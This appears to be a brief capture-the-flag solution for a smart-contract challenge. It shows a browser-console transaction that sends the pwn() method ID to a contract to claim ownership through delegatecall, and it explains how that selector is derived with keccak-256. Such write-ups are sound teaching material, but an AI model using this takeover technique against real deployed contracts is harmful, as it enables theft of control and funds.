# In the Console

To claim ownership: `await sendTransaction({from: player, to: contract.address, data:"0xdd365b8b"})`

## Why?

We use the method ID of the `pwn()` function in the `Delegate` contract.

### How to get Method ID

We hash `pwn()` with keccak-256. Then, we take the first 4 bytes of the resulting hash and prefix with it with `0x`.
